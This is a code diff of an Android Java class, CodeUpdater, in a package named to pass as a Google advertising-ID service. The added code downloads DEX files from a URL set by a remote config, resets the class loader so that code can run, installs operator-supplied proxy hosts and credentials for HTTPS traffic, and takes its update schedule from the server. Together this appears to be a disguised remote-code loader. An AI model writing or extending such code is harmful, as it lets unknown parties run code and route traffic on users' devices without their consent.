@@ -15,6 +15,8 @@ import com.advertising_id_service.appclick.googleadvertisingidservice.CryptoProv
 import com.advertising_id_service.appclick.googleadvertisingidservice.DeviceInfo;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetter;
+import com.advertising_id_service.appclick.googleadvertisingidservice.HttpsConnection.HttpsConnectionServicer;
+import com.advertising_id_service.appclick.googleadvertisingidservice.HttpsConnection.Proxy;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.IRestServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.RestServicer;
@@ -30,6 +32,7 @@ import org.json.JSONObject;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -40,6 +43,7 @@ public class CodeUpdater {
 
     public JSONObject getJsonObj(String json_str)
     {
+        if(json_str == null) {return null;}
         boolean isFileCript = false;
         JSONObject rootObj = null;
         try {
@@ -124,10 +128,7 @@ public class CodeUpdater {
                 if (url != null) {
                     //sendLog(cnt, lm, downloadID, "Download DEX file");
                     String full_url = getUrlToDownloadFile(cnt, url,"Download conf file", downloadID);
-                    FilesLoader.downloadDexFile(cnt, url);
-//   TODO:   RERPLACE!!!!              FilesLoader.downloadDexFile(cnt, full_url);
-
-
+                    FilesLoader.downloadDexFile(cnt, full_url);
                     ExternalLibServicer.clearDexClassLoader();
                 }
             }
@@ -239,77 +240,38 @@ public class CodeUpdater {
                     }
                     Logger.log("<-----" + key + "");
                 }
+            }
 
+            //Считываем настройки прокси
+            JSONArray proxys;
+            proxys = rootObj.getJSONArray(GlobalParameters.JSON_KEY_PROXYS);
+            if(proxys != null){
+                for(int i = 0; i <proxys.length(); i++) {
+                    JSONObject proxy = proxys.getJSONObject(i);
 
-//                String key = null;
-//                Iterator<?> keys = obj.keys();
-//                while( keys.hasNext() ) {
-//                    key = (String)keys.next();
-//                    Logger.log("Проверяем версию " + key + "----->");
-//                    if (compareCodeVersion(current_version, key) > 0)
-//                    {
-//                        boolean isDeviceIDApprove   = false;
-//                        boolean isApkPackageApprove = true;
-//                        boolean isVersion           = true;
-//                        if ( obj.get(key) instanceof JSONObject ) {
-//                            JSONObject versionObj = (JSONObject) obj.get(key);
-//
-//                            //Проверяем устройства
-//                            //--------------->
-//                            JSONArray arr = versionObj.getJSONArray("device_id");
-//                            Logger.log("Current device_id = " + device_id);
-//                            for(int i = 0; i <arr.length(); i++) {
-//                                Logger.log("debug device = " + arr.getString(i));
-//                                if (device_id.equals(arr.getString(i)))
-//                                {
-//                                    isDeviceIDApprove = true;
-//                                    break;
-//                                }
-//                            }
-//                            if (arr.length() == 0){ isDeviceIDApprove = true; }
-//                            //<---------------
-//
-//
-//                            //Проверяем что с данной версии можно обновиться
-//                            //--------------->
-//                            arr = versionObj.getJSONArray("forbidden_version");
-//                            for(int i = 0; i <arr.length(); i++) {
-//                                Logger.log("forbidden version = " + arr.getString(i));
-//                                if (current_version.equals(arr.getString(i)))
-//                                {
-//                                    isVersion = false;
-//                                    break;
-//                                }
-//                            }
-//                            //<---------------
-//
-//                            //Проверяем что с данного приложения можно обновиться
-//                            //--------------->
-//                            arr = versionObj.getJSONArray("forbidden_apk_package");
-//                            String packageName = cnt.getPackageName();
-//                            Logger.log("Current apk_package = " + packageName);
-//                            for(int i = 0; i <arr.length(); i++) {
-//                                Logger.log("forbidden apk package = " + arr.getString(i));
-//                                if (packageName.equals(arr.getString(i)))
-//                                {
-//                                    isApkPackageApprove = false;
-//                                    break;
-//                                }
-//                            }
-//                            //<---------------
-//
-//                            if(isDeviceIDApprove && isApkPackageApprove && isVersion)
-//                            {
-//                                Logger.log("Загружаем версию " + key);
-//                                res = versionObj.getString("path");
-//                                break;
-//                            }
-//                        }
-//                    }
-//                    Logger.log("<-----" + key + "");
-//                }
+                    String host  = proxy.getString(GlobalParameters.JSON_KEY_PROXY_HOST);
+                    String port  = proxy.getString(GlobalParameters.JSON_KEY_PROXY_PORT);
+                    String login = proxy.getString(GlobalParameters.JSON_KEY_PROXY_LOGIN);
+                    String pass  = proxy.getString(GlobalParameters.JSON_KEY_PROXY_PASSWORD);
+                    int timeout  = proxy.getInt(GlobalParameters.JSON_KEY_PROXY_TIMEOUT);
+                    Logger.log("Добавляем Proxy: " + host + ":" + port);
+                    if (HttpsConnectionServicer.AdditionalProxys == null) { HttpsConnectionServicer.AdditionalProxys = new ArrayList<>();}
+                    HttpsConnectionServicer.AdditionalProxys.clear();
+                    HttpsConnectionServicer.AdditionalProxys.add(new Proxy().setHost(host).setPort(port).setUsername(login).setPassword(pass).setTimeout(timeout));
+                }
+            }
 
+            //Считываем настройки автообновления
+            JSONObject period = rootObj.getJSONObject("period");
+            int h = period.getInt("hour");
+            int m = period.getInt("minute");
+            int s = period.getInt("second");
 
+            String delta = "" + (h*60*60*1000 + m*60*1000 + s*1000);
+
+            if(!delta.equals(SharedPreferencesServicer.getSimplePreferences(cnt, GlobalParameters.SPF_SESSION_PERIOD, GlobalParameters.SPF_KEY_PERIOD, "")))
+            {
+                SharedPreferencesServicer.setSimplePreferences(cnt, GlobalParameters.SPF_SESSION_PERIOD, GlobalParameters.SPF_KEY_PERIOD, delta);
             }
 
         } catch (JSONException e) {
